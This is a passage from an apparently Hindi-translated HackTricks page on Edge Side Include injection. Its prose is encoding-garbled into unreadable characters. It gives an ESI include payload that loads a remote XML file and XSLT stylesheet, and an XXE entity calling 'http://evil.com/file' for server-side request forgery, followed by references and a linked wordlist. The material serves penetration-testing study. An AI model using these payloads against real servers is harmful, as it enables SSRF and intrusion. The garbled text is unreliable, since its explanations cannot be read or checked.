рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ XML рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ _XML External Entity (XXE)_ рд╣рдорд▓реЛрдВ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╣рдорд▓рд╛рд╡рд░реНрддрд┐рдпреЛрдВ рдХреЛ SSRF рд╣рдорд▓реЗ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреЛ рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕реЗ ESI рдЗрдирдХреНрд▓реВрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬреЛ рдЦреБрдж рдПрдХ SSRF рд╡реЗрдХреНрдЯрд░ рд╣реИред рдмрд╛рд╣рд░реА DTDs рдХреЛ рдкрд╛рд░реНрд╕ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХреЗ рдкреАрдЫреЗ рдХреА рдкреБрд╕реНрддрдХрд╛рд▓рдп (Xalan) рдореЗрдВ рдЗрд╕рдХреЗ рд▓рд┐рдП рдХреЛрдИ рд╕рдорд░реНрдерди рдирд╣реАрдВ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдо рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓ рдирд╣реАрдВ рд╕рдХрддреЗ рд╣реИрдВред
```markup
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
рдПрдХреНрд╕рдПрд╕рдПрд▓рдЯреА рдлрд╝рд╛рдЗрд▓:
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
рдПрдХреНрд╕рдПрд╕рдПрд▓рдЯреА рдкреЗрдЬ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md](xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md)
{% endcontent-ref %}

### рд╕рдВрджрд░реНрдн

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдбрд┐рдЯреЗрдХреНрд╢рди рд╕реВрдЪреА

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ рдкреАрдбреАрдПрдл рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд░рдЦрддреЗ рд╣реИрдВ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**.

</details>
